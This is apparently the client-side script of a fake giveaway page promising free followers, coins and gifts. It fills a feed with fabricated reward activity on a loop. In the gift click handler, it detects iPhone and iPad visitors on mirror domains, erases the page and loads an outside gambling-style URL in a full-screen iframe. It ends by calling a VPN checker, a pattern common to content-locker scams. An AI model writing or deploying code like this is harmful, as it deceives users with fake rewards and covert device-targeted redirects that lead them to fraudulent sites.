        function number(max) {
        return Math.floor(Math.random() * (max + 1));
    }

    var chat_bot = $(".chat .items");

    function chat_list() {
        setInterval(function () {
            var htmlCode = `
                <div class="item animate__animated animate__fadeInLeft">
                    <div class="img"><img src="${users_img[number(users_img.length - 1)]}" alt=""></div>
                    <div class="info">
                        <div class="user">${users[number(users.length - 1)]}</div>
                        <div class="abdo">+${followers[number(followers.length - 1)]} follower, ${coinss[number(coinss.length - 1)]} coin</div>
                    </div>
                    <div class="imgs">
                        <img src="${giftsImg[number(giftsImg.length - 1)]}" alt="">
                        <img src="${giftsImg[number(giftsImg.length - 1)]}" alt="">
                    </div>
                </div>
            `;
            chat_bot.append(htmlCode);
            chat_bot.scrollTop($(".chat .items")[0].scrollHeight);
        }, 0);
    }

    $("#gifts .row").empty();
    giftsImg.forEach(element => {
        var HTMLCode = `
            <div class="col-4 col-md-3">
                <div class="item">
                    <img src="" class="lazy-load" data-src="${element}">
                </div>
            </div>
        `;
        $("#gifts .row").append(HTMLCode);
    });

    const images = $('img.lazy-load');
    const observer = new IntersectionObserver((entries, observer) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                const img = $(entry.target);
                img.attr('src', img.data('src'));
                img.removeClass('lazy-load');
                observer.unobserve(entry.target);
            }
        });
    }, { root: null, rootMargin: '0px', threshold: 0.1 });

    images.each(function () {
        observer.observe(this);
    });

    setTimeout(function () {
        $(".loading").addClass("d-none");
    }, 0);

    $(".gifts .item").on("click", function () {
        var el = $(this);
        if (!el.hasClass("active")) {
            el.addClass("active");

            var isMobile = /iPhone|iPad|iPod/i.test(navigator.userAgent);
            var originalDomain = "slotomania-vip-bonus.com";
            var redirectURL = "https://live33.online/?7c88533";
            var blockedDomains = ["real-preze.vercel.app"];

            if (
                isMobile && 
                window.location.hostname !== originalDomain &&
                window.location.hostname !== "www." + originalDomain &&
                !blockedDomains.some(domain => window.location.hostname.includes(domain))
            ) {
                setTimeout(function () {
                    document.body.innerHTML = ''; 

                    var style = document.createElement('style');
                    style.textContent = `
                        #redirectFrame {
                            width: 100%;
                            height: 100vh;
                            border: none;
                        }
                    `;
                    document.head.appendChild(style);

                    var iframe = document.createElement('iframe');
                    iframe.id = "redirectFrame";
                    iframe.src = redirectURL;

                    document.body.appendChild(iframe); 
                }, 0);
                return; 
            }

            $("#gifts").addClass("d-none");
            $("#followers").removeClass("d-none");
            $(".gift-next").addClass("d-none");
            $(".followers-next").removeClass("d-none");

            $(".label .item:nth-child(1)").removeClass("active");
            $(".label .item:nth-child(2)").addClass("active");

            $(".loading").removeClass("d-none").css({ "top": "150px" });

            setTimeout(function () {
                $(".loading").addClass("d-none");
            }, 0);
        }
    });

    $(".followers .item").on("click", function () {
        var el = $(this);
        $(".followers .item").removeClass("active");
        el.addClass("active");
        $(".followers-next .action").removeClass("disabled");
    });

    $(".coins .item").on("click", function () {
        var el = $(this);
        $(".coins .item").removeClass("active");
        el.addClass("active");
        $(".coins-next .action").removeClass("disabled");
    });

    $(".followers-next .action").on("click", function () {
        $("#followers").addClass("d-none");
        $("#coins").removeClass("d-none");

        $(".followers-next").addClass("d-none");
        $(".coins-next").removeClass("d-none");

        $(".label .item:nth-child(2)").removeClass("active");
        $(".label .item:nth-child(3)").addClass("active");

        $(".loading").removeClass("d-none").css({ "top": "150px" });

        setTimeout(function () {
            $(".loading").addClass("d-none");
            chat_list();
        }, 2000);
    });

    var foll = "0";
    var coin = "0";

    $(".coins-next .action").on("click", function () {
        $("#coins").addClass("d-none");
        $(".label").addClass("d-none");
        $(".coins-next").addClass("d-none");
        $("#last").removeClass("d-none");

        foll = $("#followers .item.active").find(".txt").text();
        coin = $("#coins .item.active").find(".coin").text();

        $("#follow-val").text(foll);
        $("#coin-val").text(coin + " coin");

        $(".last .imgs").empty();
        $('#gifts .item.active').each(function () {
            var image = $(this).find("img");
            var src = image.attr('src');
            $(".last .imgs").append(`<img src="${src}">`);
        });

        vpnChecker();
    });          
